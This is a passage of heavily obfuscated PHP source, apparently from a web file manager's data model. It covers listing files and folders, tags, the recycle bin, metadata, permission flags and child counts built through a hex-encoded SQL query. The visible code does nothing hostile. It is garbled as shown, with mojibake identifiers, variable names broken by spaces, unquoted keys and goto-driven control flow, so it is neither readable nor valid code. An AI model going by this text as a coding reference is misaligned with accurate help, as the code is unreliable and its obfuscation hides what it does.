($A£Ò’ÄÕ¤³) { $f½á¸µğî = array($eÀ¾ÊÄù¼Š[379] => array($eÀ¾ÊÄù¼Š[380], $A£Ò’ÄÕ¤³)); $bÛâøõÄ¦é = $this->listSource($f½á¸µğî); } goto F¦ìº¦î¯´; f¢º«õ‡Á: } private function listUserTagClear($DÁù‘ˆî´, $D±ˆØŞÔ, $cÙäš…à) { goto B£·Ë‡ÂÒì; eÉ›…Ú¸Ì²: Model($eÌ°¢Ü¡‚š[390])->removeFromTag($dòÜ¸‹óèí, $cÙäš…à); goto f›†æã±ßÎ; a¤›ÅİóÈœ: $dòÜ¸‹óèí = array(); $BîŒƒ·¤æ« = array_to_keyvalue($D±ˆØŞÔ[$eÌ°¢Ü¡‚š[74]], $eÌ°¢Ü¡‚š[33], $eÌ°¢Ü¡‚š[365]); $A¯ï‘¸·Æ = array_to_keyvalue($D±ˆØŞÔ[$eÌ°¢Ü¡‚š[73]], $eÌ°¢Ü¡‚š[33], $eÌ°¢Ü¡‚š[365]); goto D¦è³‚¼…; D¦è³‚¼…: $EÏö“•ßŠ˜ = array_merge($A¯ï‘¸·Æ, $BîŒƒ·¤æ«); foreach ($DÁù‘ˆî´ as $AçÅùÜçäÂ) { if (!in_array($AçÅùÜçäÂ, $EÏö“•ßŠ˜)) { $dòÜ¸‹óèí[] = $AçÅùÜçäÂ; } } if (!$dòÜ¸‹óèí) { return; } goto eÉ›…Ú¸Ì²; B£·Ë‡ÂÒì: $eÌ°¢Ü¡‚š =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$DÁù‘ˆî´) { return; } if ($D±ˆØŞÔ && count($DÁù‘ˆî´) == $D±ˆØŞÔ[$eÌ°¢Ü¡‚š[347]][$eÌ°¢Ü¡‚š[348]]) { return; } goto a¤›ÅİóÈœ; f›†æã±ßÎ: } public function listUserRecycle() { $E²µ„óˆë =& $_SERVER[Ö¹ñÒÁ²÷]; $B–†÷øŸÓø = Model($E²µ„óˆë[391])->listData(); if (!$B–†÷øŸÓø) { return array(); } $DºĞãÙÊŸ = array($E²µ„óˆë[379] => array($E²µ„óˆë[380], $B–†÷øŸÓø), $E²µ„óˆë[392] => 1); return $this->listSource($DºĞãÙÊŸ); } public function listSource($A³Ë¾ï«’ , $C¥Ü³„æé³ = 3000) { goto C¦‚Ğƒ¸àÅ; cæ«Ğæ¶°: return $Bõ¢„Û„½; goto Fôß¥‰‹”†; BŸ¿ÇÕ±›Ò: $Bõ¢„Û„½ = $this->field($A²áìİÕó®)->_makeOrder()->where($A³Ë¾ï«’ )->selectPage($C¥Ü³„æé³); $this->_listDataApply($Bõ¢„Û„½[$bÏˆÉ…®Ê›[350]]); $this->_listMake($Bõ¢„Û„½); goto cæ«Ğæ¶°; C¦‚Ğƒ¸àÅ: $bÏˆÉ…®Ê› =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($A³Ë¾ï«’ [$bÏˆÉ…®Ê›[393]])) { $A³Ë¾ï«’ [$bÏˆÉ…®Ê›[393]] = 0; } $A²áìİÕó® = $bÏˆÉ…®Ê›[394]; goto BŸ¿ÇÕ±›Ò; Fôß¥‰‹”†: } protected function _makeOrder() { goto F—ªàø¾âÇ; B¼‡›¬›«Ã: if ($D¤Ë‡º©¶Ï == $D²Çì×äñÄ[28]) { } $BöÀà‘Ê³¯ = $D²Çì×äñÄ[405] . $F‚ä‚ÃéÙ†[$D¤Ë‡º©¶Ï] . $D²Çì×äñÄ[50] . $DÀƒ’£¥ä¦[$Aˆ‹·½’°‚]; return $this->order(rtrim(trim($BöÀà‘Ê³¯), $D²Çì×äñÄ[47])); goto D²‰­ù´¬†; c¡›éÛÚ»: $DÀƒ’£¥ä¦ = array($D²Çì×äñÄ[398] => $D²Çì×äñÄ[399], $D²Çì×äñÄ[400] => $D²Çì×äñÄ[401]); $F‚ä‚ÃéÙ† = array($D²Çì×äñÄ[28] => $D²Çì×äñÄ[28], $D²Çì×äñÄ[77] => $D²Çì×äñÄ[77], $D²Çì×äñÄ[156] => $D²Çì×äñÄ[368], $D²Çì×äñÄ[374] => $D²Çì×äñÄ[374], $D²Çì×äñÄ[402] => $D²Çì×äñÄ[375], $D²Çì×äñÄ[183] => $D²Çì×äñÄ[183], $D²Çì×äñÄ[106] => $D²Çì×äñÄ[106]); $D¤Ë‡º©¶Ï = Input::get($D²Çì×äñÄ[403], $D²Çì×äñÄ[7], $AÜÔ„Õó, array_keys($F‚ä‚ÃéÙ†)); goto d’í²ÃğŒí; F—ªàø¾âÇ: $D²Çì×äñÄ =& $_SERVER[Ö¹ñÒÁ²÷]; $AÜÔ„Õó = Model($D²Çì×äñÄ[395])->get($D²Çì×äñÄ[396]); $fåùìÕ¢Çñ = Model($D²Çì×äñÄ[395])->get($D²Çì×äñÄ[397]); goto c¡›éÛÚ»; d’í²ÃğŒí: $Aˆ‹·½’°‚ = Input::get($D²Çì×äñÄ[404], $D²Çì×äñÄ[7], $fåùìÕ¢Çñ, array_keys($DÀƒ’£¥ä¦)); if (!in_array($D¤Ë‡º©¶Ï, array_keys($F‚ä‚ÃéÙ†))) { $D¤Ë‡º©¶Ï = $D²Çì×äñÄ[28]; } if (!in_array($Aˆ‹·½’°‚, array_keys($DÀƒ’£¥ä¦))) { $D¤Ë‡º©¶Ï = $D²Çì×äñÄ[398]; } goto B¼‡›¬›«Ã; D²‰­ù´¬†: } protected function _listDataApplyItem($dÄå‚öÍ”…, $aŠæ–©ğ¦ = false) { $f´ŸÃëÑÕŒ = array($dÄå‚öÍ”…); $this->_listDataApply($f´ŸÃëÑÕŒ, $aŠæ–©ğ¦); return $f´ŸÃëÑÕŒ[0]; } protected function _listDataApply(&$f ÙöŞ©†„, $E‰äÛ¢¯¯Ã = false) { goto aö˜Èˆ“î¶; aö˜Èˆ“î¶: $F÷†Û˜ö„ˆ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$f ÙöŞ©†„) { $f ÙöŞ©†„ = array(); return; } $BíŒÛôÁ°í = array_to_keyvalue($f ÙöŞ©†„, $F÷†Û˜ö„ˆ[33], $F÷†Û˜ö„ˆ[365]); goto Cè´»ÉƒÉ¯; Cè´»ÉƒÉ¯: $BíŒÛôÁ°í = array_unique($BíŒÛôÁ°í); $this->_listSourceCache($f ÙöŞ©†„); if (!$E‰äÛ¢¯¯Ã) { $this->_listAppendMeta($f ÙöŞ©†„, $BíŒÛôÁ°í); $this->_listAppendFileMeta($f ÙöŞ©†„, $BíŒÛôÁ°í); $this->_listAppendChildren($f ÙöŞ©†„, $BíŒÛôÁ°í); } goto A¹˜ç«ßÑ; dØí–ºó¹: $this->_listAppendUser($f ÙöŞ©†„); $this->_listFilterInfo($f ÙöŞ©†„, $E‰äÛ¢¯¯Ã); goto AàÄóğ÷†İ; A¹˜ç«ßÑ: $this->_listAppendPath($f ÙöŞ©†„); $this->_listAppendAuth($f ÙöŞ©†„); $this->_listAppendSourceInfo($f ÙöŞ©†„, $BíŒÛôÁ°í); goto dØí–ºó¹; AàÄóğ÷†İ: } protected function _listSourceCache($D†Õ’ù“ŞĞ) { $dô„ç°Öğ =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($D†Õ’ù“ŞĞ as $B²øŞ‹¤Á») { self::$cacheSourceInfo[$dô„ç°Öğ[406] . $B²øŞ‹¤Á»[$dô„ç°Öğ[365]]] = $B²øŞ‹¤Á»; } } protected function _listFilterInfo(&$f“¦‰Éİ, $BµùµßÑÛÆ = false) { $C‡Æâ¶ùË =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($f“¦‰Éİ as &$Cç¤µ…¤§) { $Cç¤µ…¤§ = $this->pathInfoFilter($Cç¤µ…¤§); self::$cachePathInfo[$C‡Æâ¶ùË[407] . intval($BµùµßÑÛÆ) . $C‡Æâ¶ùË[408] . $Cç¤µ…¤§[$C‡Æâ¶ùË[365]]] = $Cç¤µ…¤§; } } protected function _listMake(&$Cà™ø²æ›) { $fÏ¦ŸœÁŒÔ =& $_SERVER[Ö¹ñÒÁ²÷]; $Cà™ø²æ›[$fÏ¦ŸœÁŒÔ[74]] = array(); $Cà™ø²æ›[$fÏ¦ŸœÁŒÔ[73]] = array(); foreach ($Cà™ø²æ›[$fÏ¦ŸœÁŒÔ[350]] as $B’Àğµ¬Æ) { $Aº±ááİãô = $B’Àğµ¬Æ[$fÏ¦ŸœÁŒÔ[366]] == 1 ? $fÏ¦ŸœÁŒÔ[74] : $fÏ¦ŸœÁŒÔ[73]; $Cà™ø²æ›[$Aº±ááİãô][] = $B’Àğµ¬Æ; } unset($Cà™ø²æ›[$fÏ¦ŸœÁŒÔ[350]]); } protected function _listAppendMeta(&$fÌÄÆŸí—, $B¾¦ïŒˆˆ ) { goto f½å‘¸ÔŒÏ; b‰ÆÅĞµö: foreach ($BšßÇ±„Æ­ as $eáÇÛ³…®) { if (!isset($EéÌ¯¹”Ü[$eáÇÛ³…®[$fÄå†–µŒ[365]]])) { $EéÌ¯¹”Ü[$eáÇÛ³…®[$fÄå†–µŒ[365]]] = array(); } if (in_array($eáÇÛ³…®[$fÄå†–µŒ[89]], $Eê×¤™Â–)) { continue; } $EéÌ¯¹”Ü[$eáÇÛ³…®[$fÄå†–µŒ[365]]][$eáÇÛ³…®[$fÄå†–µŒ[89]]] = $eáÇÛ³…®[$fÄå†–µŒ[355]]; } foreach ($fÌÄÆŸí— as &$eóïÉ´ê) { $eóïÉ´ê[$fÄå†–µŒ[413]] = !1; if (isset($EéÌ¯¹”Ü[$eóïÉ´ê[$fÄå†–µŒ[365]]])) { $eóïÉ´ê[$fÄå†–µŒ[413]] = $EéÌ¯¹”Ü[$eóïÉ´ê[$fÄå†–µŒ[365]]]; } if ($this->fileIsLock($eóïÉ´ê) && $eóïÉ´ê[$fÄå†–µŒ[372]]) { $b×èÙ¨…ºó = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $eóïÉ´ê[$fÄå†–µŒ[372]][$fÄå†–µŒ[373]] = AuthModel::authDisable($eóïÉ´ê[$fÄå†–µŒ[372]][$fÄå†–µŒ[373]], $b×èÙ¨…ºó); $eóïÉ´ê[$fÄå†–µŒ[372]][$fÄå†–µŒ[414]][$fÄå†–µŒ[372]] = $eóïÉ´ê[$fÄå†–µŒ[372]][$fÄå†–µŒ[373]]; } } goto d†¶ÏÊ¾àñ; f½å‘¸ÔŒÏ: $fÄå†–µŒ =& $_SERVER[Ö¹ñÒÁ²÷]; $Eã©ÑİÌ¤˜ = array($fÄå†–µŒ[379] => array($fÄå†–µŒ[380], $B¾¦ïŒˆˆ )); $BšßÇ±„Æ­ = Model($fÄå†–µŒ[409])->field($fÄå†–µŒ[410])->where($Eã©ÑİÌ¤˜)->select(); goto C×éãÕïß; C×éãÕïß: if (!$BšßÇ±„Æ­) { return; } $Eê×¤™Â– = array($fÄå†–µŒ[411], $fÄå†–µŒ[412]); $EéÌ¯¹”Ü = array(); goto b‰ÆÅĞµö; d†¶ÏÊ¾àñ: } protected function _listAppendFileMeta(&$fÆÃº‰­ö•, $EŸãÁ²ã™à) { goto Eš³¡è©„; d™Ú„ˆÄ‡: $F›­ØÌºñ = Model($a©’Ìù ·ğ[418])->field($A”µË»¯Ñ)->where($f¤Øñ†œïİ)->select(); $F›­ØÌºñ = array_to_keyvalue($F›­ØÌºñ, $a©’Ìù ·ğ[415]); $c¡À– îÔÙ = Model($a©’Ìù ·ğ[419])->field($a©’Ìù ·ğ[420])->where($f¤Øñ†œïİ)->select(); goto F†‚ÍĞĞ; F†‚ÍĞĞ: $c¡À– îÔÙ = $c¡À– îÔÙ ? $c¡À– îÔÙ : array(); $c¡Ëßè……µ = array(); foreach ($c¡À– îÔÙ as $EäƒŸ”í›œ) { if (!isset($c¡Ëßè……µ[$EäƒŸ”í›œ[$a©’Ìù ·ğ[415]]])) { $c¡Ëßè……µ[$EäƒŸ”í›œ[$a©’Ìù ·ğ[415]]] = array(); } $c¡Ëßè……µ[$EäƒŸ”í›œ[$a©’Ìù ·ğ[415]]][$EäƒŸ”í›œ[$a©’Ìù ·ğ[89]]] = $EäƒŸ”í›œ[$a©’Ìù ·ğ[355]]; } goto cÇË—¯¥Ğª; cÇË—¯¥Ğª: foreach ($fÆÃº‰­ö• as &$D½Œ§Î‰¹) { goto EœƒïåÎ×•; D¤¾¦âóÕ°: unset($F›­ØÌºñ[$FãÄœ‡“‘»][$a©’Ìù ·ğ[75]]); $b®§Œ¸®¸› = is_array($c¡Ëßè……µ[$FãÄœ‡“‘»]) ? $c¡Ëßè……µ[$FãÄœ‡“‘»] : array(); $D½Œ§Î‰¹[$a©’Ìù ·ğ[158]] = array_merge($b®§Œ¸®¸›, $F›­ØÌºñ[$FãÄœ‡“‘»]); goto c‡Ü³ó‘Ø; EœƒïåÎ×•: $FãÄœ‡“‘» = $D½Œ§Î‰¹[$a©’Ìù ·ğ[415]]; if (!$FãÄœ‡“‘» || !isset($F›­ØÌºñ[$FãÄœ‡“‘»])) { continue; } $A”Ó‡¹ï„ = $F›­ØÌºñ[$FãÄœ‡“‘»]; goto DŸ”¢—èçÈ; DŸ”¢—èçÈ: $A”Ó‡¹ï„[$a©’Ìù ·ğ[77]] = $D½Œ§Î‰¹[$a©’Ìù ·ğ[77]]; $A”Ó‡¹ï„[$a©’Ìù ·ğ[28]] = $D½Œ§Î‰¹[$a©’Ìù ·ğ[28]]; self::$cacheFileInfo[$a©’Ìù ·ğ[421] . $FãÄœ‡“‘»] = $A”Ó‡¹ï„; goto D¤¾¦âóÕ°; c‡Ü³ó‘Ø: if (isset($D½Œ§Î‰¹[$a©’Ìù ·ğ[158]][$a©’Ìù ·ğ[422]])) { $D½Œ§Î‰¹[$a©’Ìù ·ğ[422]] = json_decode($D½Œ§Î‰¹[$a©’Ìù ·ğ[158]][$a©’Ìù ·ğ[422]], !0); unset($D½Œ§Î‰¹[$a©’Ìù ·ğ[158]][$a©’Ìù ·ğ[422]]); } goto f³Ìõ‡Ø„¦; f³Ìõ‡Ø„¦: } goto A¡¬ÎÆ›±™; Eš³¡è©„: $a©’Ìù ·ğ =& $_SERVER[Ö¹ñÒÁ²÷]; $F‹‹š õºÜ = array_to_keyvalue($fÆÃº‰­ö•, $a©’Ìù ·ğ[33], $a©’Ìù ·ğ[415]); $F‹‹š õºÜ = array_filter(array_unique($F‹‹š õºÜ)); goto E™‚åÚŸƒ‘; E™‚åÚŸƒ‘: if (!$F‹‹š õºÜ) { return; } $f¤Øñ†œïİ = array($a©’Ìù ·ğ[416] => array($a©’Ìù ·ğ[380], $F‹‹š õºÜ)); $A”µË»¯Ñ = $a©’Ìù ·ğ[417]; goto d™Ú„ˆÄ‡; A¡¬ÎÆ›±™: } protected function _listAppendSourceInfo(&$b…äò‘¾‹Œ, $d‡¶Œ›¦®Ø) { goto cñ›ê˜é–; bí×¿º©¦‡: $cÖƒğ™Üİì = array_to_keyvalue($aù‹Å‹§ğé, $f¢‘äƒ—’ğ[363]); $f½œÔöø…Ò = array_to_keyvalue_group($D¡ñßÎŒ›’, $f¢‘äƒ—’ğ[75], $f¢‘äƒ—’ğ[389]); $A—ƒŞáà» = array_to_keyvalue($c®ÕÅàÂâÒ, $f¢‘äƒ—’ğ[75]); goto A éÁÄ¢Ô; cñ›ê˜é–: $f¢‘äƒ—’ğ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!defined($f¢‘äƒ—’ğ[423])) { return; } $aù‹Å‹§ğé = Model($f¢‘äƒ—’ğ[424])->listData(); goto fƒæ¶ª·; fƒæ¶ª·: $D¡ñßÎŒ›’ = Model($f¢‘äƒ—’ğ[388])->listData(); $c®ÕÅàÂâÒ = Model($f¢‘äƒ—’ğ[377])->listData(); $e”ç½Š¢Í¹ = Model($f¢‘äƒ—’ğ[425])->listSimple(); goto bí×¿º©¦‡; A éÁÄ¢Ô: $EÏ™Ÿ¯óÎÑ = array_to_keyvalue_group($e”ç½Š¢Í¹, $f¢‘äƒ—’ğ[365]); foreach ($b…äò‘¾‹Œ as &$Eä¼Š¥»Œº) { $Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[387]] = array($f¢‘äƒ—’ğ[426] => 0, $f¢‘äƒ—’ğ[427] => 0, $f¢‘äƒ—’ğ[428] => 0); if (isset($A—ƒŞáà»[$Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[365]]])) { $Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[387]][$f¢‘äƒ—’ğ[429]] = 1; $Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[387]][$f¢‘äƒ—’ğ[430]] = $A—ƒŞáà»[$Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[365]]][$f¢‘äƒ—’ğ[28]]; } if (isset($f½œÔöø…Ò[$Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[365]]])) { $Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[387]][$f¢‘äƒ—’ğ[431]] = array(); foreach ($f½œÔöø…Ò[$Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[365]]] as $a—ÆîÕ‡) { $A–Ø†¶Ç×ã = $cÖƒğ™Üİì[$a—ÆîÕ‡]; $Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[387]][$f¢‘äƒ—’ğ[431]][] = array($f¢‘äƒ—’ğ[432] => $A–Ø†¶Ç×ã[$f¢‘äƒ—’ğ[363]], $f¢‘äƒ—’ğ[382] => $A–Ø†¶Ç×ã[$f¢‘äƒ—’ğ[28]], $f¢‘äƒ—’ğ[433] => $A–Ø†¶Ç×ã[$f¢‘äƒ—’ğ[434]]); } } if (isset($EÏ™Ÿ¯óÎÑ[$Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[365]]])) { $Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[387]][$f¢‘äƒ—’ğ[435]] = array(); foreach ($EÏ™Ÿ¯óÎÑ[$Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[365]]] as $Eğ‹îùÔ²¼) { $Eä¼Š¥»Œº[$f¢‘äƒ—’ğ[387]][$f¢‘äƒ—’ğ[435]] = array($f¢‘äƒ—’ğ[436] => $Eğ‹îùÔ²¼[$f¢‘äƒ—’ğ[437]], $f¢‘äƒ—’ğ[438] => $Eğ‹îùÔ²¼[$f¢‘äƒ—’ğ[439]], $f¢‘äƒ—’ğ[440] => $Eğ‹îùÔ²¼[$f¢‘äƒ—’ğ[365]], $f¢‘äƒ—’ğ[441] => $Eğ‹îùÔ²¼[$f¢‘äƒ—’ğ[442]], $f¢‘äƒ—’ğ[443] => $Eğ‹îùÔ²¼[$f¢‘äƒ—’ğ[444]]); } } } return $b…äò‘¾‹Œ; goto eòŒ¼¯½èø; eòŒ¼¯½èø: } protected function _listAppendChildren(&$EóñÈÆƒïÕ, $fÉä§ˆÈ„Ü) { goto fİ·Û Ì•À; A·¸—™¦á¡: foreach ($EóñÈÆƒïÕ as &$eñ¿íË£) { if ($eñ¿íË£[$D©•ÜÊ›¯[366]]) { unset($eñ¿íË£[$D©•ÜÊ›¯[368]]); $eñ¿íË£[$D©•ÜÊ›¯[188]] = intval($e¶ŠŞ·×ë­[$eñ¿íË£[$D©•ÜÊ›¯[365]] . $D©•ÜÊ›¯[447]][$D©•ÜÊ›¯[448]]); $eñ¿íË£[$D©•ÜÊ›¯[187]] = intval($e¶ŠŞ·×ë­[$eñ¿íË£[$D©•ÜÊ›¯[365]] . $D©•ÜÊ›¯[449]][$D©•ÜÊ›¯[448]]); } } goto Bİ„¡ç½ãŞ; fİ·Û Ì•À: $D©•ÜÊ›¯ =& $_SERVER[Ö¹ñÒÁ²÷]; $E²…Á±Ö… = $D©•ÜÊ›¯[357]; $e¶ŠŞ·×ë­ = array(); goto CãâÇÖ£‰¾; F÷³ªÔ‚öÒ: $d¡Ãİ´ğé = $this->tablePrefix . $this->tableName; for ($få‘¯Ì°ó³ = 0; $få‘¯Ì°ó³ < $C”Ó¹¦Á¥; $få‘¯Ì°ó³++) { $eôÂ™£ÖŞ = intval($EóñÈÆƒïÕ[$få‘¯Ì°ó³][$D©•ÜÊ›¯[393]]); if ($EóñÈÆƒïÕ[$få‘¯Ì°ó³][$D©•ÜÊ›¯[366]]) { $eĞµ‰õàÅå = $EóñÈÆƒïÕ[$få‘¯Ì°ó³][$D©•ÜÊ›¯[365]]; $E²…Á±Ö… .= "\x53\105\x4c\x45\x43\124\x20\52\40\x46\122\x4f\115\x20\x28\123\105\x4c\105\103\124\40\x27{$eĞµ‰õàÅå}\137\150\x61\163\106\x69\x6c\145\47\40\141\x73\40\x68\141\x73\54\143\x6f\165\156\x74\50\x31\x29\40\141\163\40\x68\x61\163\103\x6f\x75\x6e\164\x20\x46\x52\x4f\115\40\x60{$d¡Ãİ´ğé}\x60\40\xa\11\x9\x9\11\11\167\150\145\162\145\40\x70\141\162\x65\x6e\x74\x49\104\x3d{$eĞµ‰õàÅå}\x20\141\x6e\x64\x20\151\x73\106\157\154\144\145\x72\x3d\60\x20\141\156\144\40\x69\163\104\x65\x6c\x65\x74\x65\x3d{$eôÂ™£ÖŞ}\x29\40\141\163\40\164\x62\61\x5f{$eĞµ‰õàÅå}\x20\165\x6e\x69\x6f\x6e\x20\141\154\x6c\x20\xa\x9\x9\11\x9\x9\x53\x45\x4c\105\x43\124\40\52\x20\x46\x52\x4f\115\x20\50\123\x45\114\x45\103\124\x20\x27{$eĞµ‰õàÅå}\137\150\141\x73\x46\x6f\154\144\145\x72\x27\x20\141\x73\40\150\141\163\x46\x69\154\145\x2c\143\x6f\165\x6e\164\x28\x31\51\x20\x61\x73\x20\150\141\x73\103\157\x75\156\x74\40\x46\x52\117\x4d\40\140{$d¡Ãİ´ğé}\140\40\xa\x9\x9\x9\11\x9\167\x68\145\x72\x65\x20\160\x61\x72\x65\156\164\111\104\75{$eĞµ‰õàÅå}\x20\x61\156\x64\x20\151\x73\106\157\154\x64\145\162\x3d\x31\40\141\156\x64\x20\151\163\x44\x65\154\x65\164\x65\x3d{$eôÂ™£ÖŞ}\51\40\x61\x73\40\164\x62\62\x5f{$eĞµ‰õàÅå}\40\x75\156\151\157\x6e\40\x61\154\154\x20"; } if ((strlen($E²…Á±Ö…) >= $EÚô±·ŠÉÚ || $få‘¯Ì°ó³ == $C”Ó¹¦Á¥ - 1) && $E²…Á±Ö…) { $E²…Á±Ö… = substr($E²…Á±Ö…, 0, -strlen($D©•ÜÊ›¯[445])); $E”ò‚ƒË·— = $this->query($E²…Á±Ö…); $e¶ŠŞ·×ë­ = array_merge($e¶ŠŞ·×ë­, $E”ò‚ƒË·—); $E²…Á±Ö… = $D©•ÜÊ›¯[33]; } } $e¶ŠŞ·×ë­ = array_to_keyvalue($e¶ŠŞ·×ë­, $D©•ÜÊ›¯[446]); goto A·¸—™¦á¡; CãâÇÖ£‰¾: $EÚô±·ŠÉÚ = 1024 * 50; $EóñÈÆƒïÕ = is_array($EóñÈÆƒïÕ) ? $EóñÈÆƒïÕ : array(); $C”Ó¹¦Á¥ = count($EóñÈÆƒïÕ); goto F÷³ªÔ‚öÒ; Bİ„¡ç½ãŞ: } protected function _listAppendAuth(&$a‚†½±»ó˜) { goto Cˆ”ÒÏÙ»õ; dÅªÒùñÜ: foreach ($a‚†½±»ó˜ as $aÄ¬´ß‡‘…) { if ($aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[367]] == self::TYPE_GROUP) { $a‚ÑèÎÜÀ[] = $aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[365]]; } } if (!$a‚ÑèÎÜÀ) { return; } $fÛÄªÉãÍ» = array_to_keyvalue($a‚†½±»ó˜, $e¬˜ÚÜĞÖĞ[365]); goto d®Òª¾ÙÓ“; Cˆ”ÒÏÙ»õ: $e¬˜ÚÜĞÖĞ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!defined($e¬˜ÚÜĞÖĞ[423])) { return; } $a‚ÑèÎÜÀ = array(); goto dÅªÒùñÜ; d®Òª¾ÙÓ“: $C•Œ†Ö‹Ç = Model($e¬˜ÚÜĞÖĞ[450])->getSourceList($a‚ÑèÎÜÀ, $fÛÄªÉãÍ»); foreach ($a‚†½±»ó˜ as $B‘„Ñó÷›Á => &$aÄ¬´ß‡‘…) { $aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[372]] = $C•Œ†Ö‹Ç[$aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[365]]]; if (!$aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[372]] && $aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[367]] == self::TYPE_GROUP) { $aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[372]] = Action($e¬˜ÚÜĞÖĞ[451])->pathGroupAuthMake($aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[452]]); if (!$aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[372]] && !_get($GLOBALS, $e¬˜ÚÜĞÖĞ[453])) { $aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[185]] = !1; $aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[184]] = !1; } } if ($aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[372]]) { $aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[185]] = AuthModel::authCheckEdit($aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[372]][$e¬˜ÚÜĞÖĞ[373]]); $aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[184]] = AuthModel::authCheckView($aÄ¬´ß‡‘…[$e¬˜ÚÜĞÖĞ[372]][$e¬˜ÚÜĞÖĞ[373]]); } $this->groupPathDisplay($aÄ¬´ß‡‘…); } goto câÇœ„¸¯œ; câÇœ„¸¯œ: } public function groupPathDisplay(&$F¹ùö„âˆ) { goto b²¡‹ğ×à²; BÌåÙ£äšç: $F¹ùö„âˆ[$AÀ…éß¹è [456]] = $D¹Š½ùÌ¼[$AÀ…éß¹è [457]]; $F¹ùö„âˆ[$AÀ…éß¹è [376]] = $D¹Š½ùÌ¼[$AÀ…éß¹è [455]]; $F¹ùö„âˆ[$AÀ…éß¹è [458]] = $D¹Š½ùÌ¼[$AÀ…éß¹è [459]]; goto a«–ˆ‰õø¾; b²¡‹ğ×à²: $AÀ…éß¹è  =& $_SERVER[Ö¹ñÒÁ²÷]; if ($F¹ùö„âˆ[$AÀ…éß¹è [367]] != self::TYPE_GROUP) { return; } $D¹Š½ùÌ¼ = Model($AÀ…éß¹è [454])->getInfo($F¹ùö„âˆ[$AÀ…éß¹è [452]]); goto e¥Æ˜Ü£Ç¸; e¥Æ˜Ü£Ç¸: $dë³‚ÂÁ‰¥ = $this->parentLevelArray($D¹Š½ùÌ¼[$AÀ…éß¹è [455]]); $f•˜ƒáà«è = $AÀ…éß¹è [33]; foreach ($dë³‚ÂÁ‰¥ as $Aß‰èÒ±») { $d‘‹ßº Ğ = Model($AÀ…éß¹è [454])->getInfo($Aß‰èÒ±»); $f•˜ƒáà«è .= $d‘‹ßº Ğ[$AÀ…éß¹è [387]][$AÀ…éß¹è [365]] . $AÀ…éß¹è [47]; } goto BÌåÙ£äšç; a«–ˆ‰õø¾: $F¹ùö„âˆ[$AÀ…éß¹è [460]] = $f•˜ƒáà«è . $D¹Š½ùÌ¼[$AÀ…éß¹è [387]][$AÀ…éß¹è [365]]; goto d×çŠŒŒ–; d×çŠŒŒ–: } protected function _listAppendPath(&$FÍÜå«íÕ) { goto aÇ¬šÍ­; AÙ½È–í¡: $AË¾¤Ğ‘¨ù = array(); foreach ($d…ˆÎóÆò as $bçõ“š–º => $bÑŸ¯Ééï) { if (!$bÑŸ¯Ééï) { $AË¾¤Ğ‘¨ù[] = $bçõ“š–º; } } if ($AË¾¤Ğ‘¨ù) { $Dè¬¥••Ì˜ = array($C‘ £ˆÀË¾[379] => array($C‘ £ˆÀË¾[380], $AË¾¤Ğ‘¨ù)); if (count($AË¾¤Ğ‘¨ù) == 1) { $CùÍâ¶¹‰õ = $this->sourceInfo($AË¾¤Ğ‘¨ù[0]); $CùÍâ¶¹‰õ = is_array($CùÍâ¶¹‰õ) ? array($CùÍâ¶¹‰õ) : !1; } else { $CùÍâ¶¹‰õ = $this->field($C‘ £ˆÀË¾[461])->where($Dè¬¥••Ì˜)->select(); } $FŠ¹Ô›ªà = array_to_keyvalue($CùÍâ¶¹‰õ, $C‘ £ˆÀË¾[365], $C‘ £ˆÀË¾[28]); $d…ˆÎóÆò = array_merge_index($d…ˆÎóÆò, $FŠ¹Ô›ªà); } goto b¸©é®ß—à; b¸©é®ß—à: $F•äË¿éÕ× = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($FÍÜå«íÕ as &$A–¿²¨¥‹‚) { goto AœÚêß—ºë; a—‡÷ÍØ¤Ò: $aòß¢–ó’” = trim($A–¿²¨¥‹‚[$C‘ £ˆÀË¾[462]], $C‘ £ˆÀË¾[8]); if ($A–¿²¨¥‹‚[$C‘ £ˆÀË¾[457]] == $C‘ £ˆÀË¾[464] && $aòß¢–ó’”) { $A–¿²¨¥‹‚[$C‘ £ˆÀË¾[28]] = $aòß¢–ó’”; } $this->_listAppendPathRecycle($A–¿²¨¥‹‚, $fàŸº¢‹ª”, $F•äË¿éÕ×); goto B™ë‘‘†…ã; BÃÛÌÔ±ˆ: if ($fàŸº¢‹ª”) { $bÂ¿” ùºÕ .= $A–¿²¨¥‹‚[$C‘ £ˆÀË¾[28]]; } if ($A–¿²¨¥‹‚[$C‘ £ˆÀË¾[366]]) { $bÂ¿” ùºÕ .= $C‘ £ˆÀË¾[8]; } $A–¿²¨¥‹‚[$C‘ £ˆÀË¾[462]] = str_replace($C‘ £ˆÀË¾[463], $C‘ 